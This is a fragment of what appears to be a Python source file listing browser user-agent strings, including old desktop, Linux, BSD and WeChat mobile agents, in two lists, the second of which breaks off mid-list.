     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']

mozila = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
